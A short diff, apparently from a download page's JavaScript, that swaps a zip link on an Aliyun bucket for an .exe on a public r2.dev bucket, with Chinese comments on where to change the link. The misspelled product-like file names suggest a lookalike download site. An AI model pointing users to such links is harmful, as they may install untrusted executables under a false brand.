@@ -1,9 +1,9 @@
  
 
-var xz = "https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip";
+var xz = "https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe";
 
-//可以把   https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip  这个改成下载地址；https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip
-//可以把   https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip  这个改成文件下载：/xiazai/kuailian.zip
+//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成下载地址；https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe
+//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成文件下载：https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe
 
 
 
